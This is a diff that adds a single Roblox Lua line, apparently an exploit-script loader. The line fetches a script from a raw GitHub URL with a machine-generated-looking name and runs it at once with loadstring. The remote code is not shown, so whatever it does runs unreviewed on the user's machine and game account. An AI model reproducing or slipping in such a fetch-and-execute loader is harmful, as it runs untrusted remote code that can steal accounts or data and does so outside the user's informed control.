@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/BaseLizardFascinate/loaders/main/loaders/electricity-bricklayer-spam4-7yei33bmoe32cd.lua"))()
